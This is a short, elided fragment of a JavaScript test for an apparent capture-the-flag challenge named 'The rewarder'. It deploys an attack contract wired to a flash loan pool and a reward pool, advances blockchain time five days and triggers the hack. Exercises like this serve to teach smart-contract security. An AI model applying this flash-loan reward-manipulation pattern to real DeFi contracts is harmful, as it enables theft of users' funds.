...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        const TheRewardHackContractFactory = await ethers.getContractFactory("TheRewarderHack", deployer);

        this.rewardHack = await TheRewardHackContractFactory.deploy(this.flashLoanPool.address, this.rewarderPool.address, attacker.address, this.liquidityToken.address, this.rewardToken.address);

        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days

        await this.rewardHack.hack(TOKENS_IN_LENDER_POOL);
    });
